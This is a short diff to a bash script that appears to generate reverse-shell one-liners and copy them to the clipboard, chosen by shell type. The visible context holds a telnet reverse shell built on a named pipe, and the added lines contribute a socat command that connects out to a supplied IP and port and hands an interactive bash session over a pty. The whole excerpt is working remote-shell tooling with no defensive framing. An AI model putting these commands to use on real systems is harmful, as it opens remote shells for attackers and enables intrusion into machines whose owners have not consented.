@@ -80,6 +80,12 @@ case $shell in
         echo -n "rm -f /tmp/p; mknod /tmp/p p && telnet "$ip" "$port" 0/tmp/p" | xclip -selection clipboard
         echo -e "\e[32mTelnet Shell Copied\e[0m"
         ;;
+'socat') # Done
+        echo -n '> socat tcp-connect:'$ip':'$port' exec:"bash -li",pty,stderr,setsid,sigint,sane' | xclip -selection clipboard
+        echo -e "\e[32mSocat Shell Copied\e[0m"
+        ;;
+
+
 *) # Case for not finding anything
 	echo -e "\e[91mDid not copy anything\e[0m"
 	;;
